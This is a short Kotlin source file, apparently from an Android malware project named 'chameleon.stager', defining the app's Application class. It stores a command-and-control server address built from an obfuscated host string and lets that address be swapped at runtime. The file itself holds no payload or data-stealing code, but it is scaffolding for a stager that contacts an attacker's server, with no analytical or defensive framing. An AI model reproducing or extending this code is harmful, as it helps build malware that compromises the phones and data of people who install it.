package com.chameleon.stager

import android.app.Application
import android.content.Context
import com.chameleon.stager.utils.ObfuscatedStrings

class StagerApplication : Application() {
    companion object {
        lateinit var instance: StagerApplication
            private set
        val c2BaseUrl: String
            get() = "https://${ObfuscatedStrings.c2Host}"

        var c2RealUrl: String = ""
            private set

        fun updateC2Url(url: String) {
            c2RealUrl = url
        }
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
    }

    override fun attachBaseContext(base: Context) {
        super.attachBaseContext(base)
    }
}
